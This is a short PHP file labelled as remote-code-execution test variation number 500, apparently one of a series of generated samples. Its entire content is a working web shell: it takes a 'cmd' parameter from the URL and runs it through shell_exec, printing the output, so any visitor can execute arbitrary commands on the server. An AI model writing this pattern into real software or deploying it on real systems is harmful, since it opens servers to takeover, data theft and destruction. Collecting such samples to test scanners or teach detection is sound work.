<?php
// RCE test variation #500
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>